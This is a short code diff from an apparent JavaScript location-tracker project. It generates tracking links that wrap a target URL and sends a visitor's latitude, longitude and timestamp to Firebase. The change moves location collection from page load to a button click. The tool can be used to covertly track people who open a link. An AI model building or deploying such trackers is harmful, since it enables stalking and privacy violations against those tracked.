@@ -20,6 +20,9 @@ createLinkButton.addEventListener('click', () => {
     const trackingId = generateTrackingId();
     const trackingUrl = `https://lavinia0cristine0souza.github.io/rastreador-localizacao/track?id=${trackingId}&url=${encodeURIComponent(url)}`;
     trackingLink.textContent = trackingUrl;
+
+    // Colete os dados de localização apenas quando o usuário clicar no link
+    getLocation();
 });
 
 function generateTrackingId() {
@@ -42,7 +45,3 @@ function sendLocationToFirebase(latitude, longitude) {
         timestamp: Date.now()
     });
 }
-
-window.onload = function() {
-    getLocation();
-};
